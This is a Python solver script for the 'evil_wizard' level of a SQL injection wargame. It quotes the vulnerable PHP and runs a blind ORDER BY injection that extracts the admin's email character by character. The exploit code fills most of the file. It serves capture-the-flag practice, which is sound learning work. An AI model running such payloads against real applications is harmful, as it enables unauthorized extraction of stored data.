#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return args[0].index('admin') < args[0].index('rubiya')


def main():
    """
    Evil_wizard 24

    if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
    $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}";
    echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
    $rows = mysqli_query($db,$query);
    while(($result = mysqli_fetch_array($rows))){
      if($result['id'] == "admin") $result['email'] = "**************";
      echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
    }
    echo "</table><hr>query : <strong>{$query}</strong><hr>";

    $_GET[email] = addslashes($_GET[email]);
    $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
    """

    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'order'

    payload = "id='admin' and length(email)<%s desc"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"id='admin' and ord(mid(email,%d,1))<%s desc"
    result = p.find_binary(check_func, len_of_key)

    p.inj_param = 'email'
    p.payload = result
    response = p.my_request()
    if 'Clear!' in response:
        print('\nEvil_wizard Clear!')


if __name__ == '__main__':
    main()
